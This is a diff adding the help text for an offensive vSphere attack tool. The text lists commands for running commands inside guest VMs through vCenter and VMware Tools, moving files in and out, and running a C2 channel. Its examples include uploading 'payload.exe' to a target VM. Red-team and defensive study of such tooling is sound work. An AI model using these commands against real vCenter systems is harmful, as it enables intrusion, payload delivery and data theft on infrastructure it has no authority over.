@@ -1,0 +1,34 @@
+ABOUT
+    VSphere infrastructure attack tool. Interacts with guest VMs via VMware
+    Tools and the vSphere Web Services API for execution, file transfer, and
+    memory dumping.
+USAGE:
+    net-sharp-sphere --- <command> [options]
+
+COMMANDS:
+    list        List VMs managed by vCenter with VMware Tools running
+    execute     Execute command in target VM guest OS
+    upload      Upload file to target VM
+    download    Download file from target VM
+    c2          Run C2 via C3 VMwareShareFile module
+
+LIST OPTIONS:
+    --url         vCenter SDK URL (required, e.g. https://127.0.0.1/sdk)
+    --username    vCenter username (default: pass through auth)
+    --password    vCenter password
+    --verbose     Print vCenter users and groups
+
+EXECUTE OPTIONS:
+    --url              vCenter SDK URL (required)
+    --ip               Target VM IP address (required)
+    --command          Command to execute (required)
+    --guestusername    Guest OS username
+    --guestpassword    Guest OS password
+    --output           Capture and return command output
+    --outputDir        Directory for temporary output file on guest
+    --linux            Target VM is Linux
+
+EXAMPLES:
+    net-sharp-sphere --- list --url https://vcenter.local/sdk --username admin@vsphere.local --password pass
+    net-sharp-sphere --- execute --url https://vcenter.local/sdk --ip 10.0.0.5 --command whoami --output
+    net-sharp-sphere --- upload --url https://vcenter.local/sdk --ip 10.0.0.5 --localpath payload.exe --remotepath C:\\Temp\\payload.exe
